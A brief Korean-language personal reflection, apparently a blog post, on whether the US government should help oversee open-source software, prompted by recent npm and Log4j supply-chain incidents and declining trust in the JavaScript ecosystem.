[`google`이 오픈소스 소프트웨어 감독, 미국 정부가 해야](https://www.boannews.com/media/view.asp?idx=104118) 했을 때, 국경없는 오픈소스에 정부가, 어느 특정 나라가 하는 것이 과연 옳은가? 그냥 미국이랑 구글, MS가 자기들이 소프트웨어 시장을 주도하려고 짜는 거 아닌가? 생각했던 적이 있습니다만,

`Log4j`, `colors`, `faker`, `node-ipc` 등등 불과 몇 개월 동안 일어난 일을 생각하면 저 같은 사람은 이런 일을 바로 알기도 어렵고, 해결 방법도 찾으려면 상당한 수고가 들으니 확실히 미국 정부가 오픈소스 재단같은 곳과 함께 감독해야 하는 것이 정말 필요한 것 같습니다...
몇 개월 동안에 이런 일이 계속 일어남에 따라 JavaScript, npm에 대한 신뢰가 떨어진다면 새로운 생태계가 만들어 질 수도 있겠구나 생각도 됩니다.
예전에 본 글에서도 이런 문제때문에 아예 npm 같은 패키지 매니저를 사용하지 않는 회사도 있다는 기억도 있어서요.
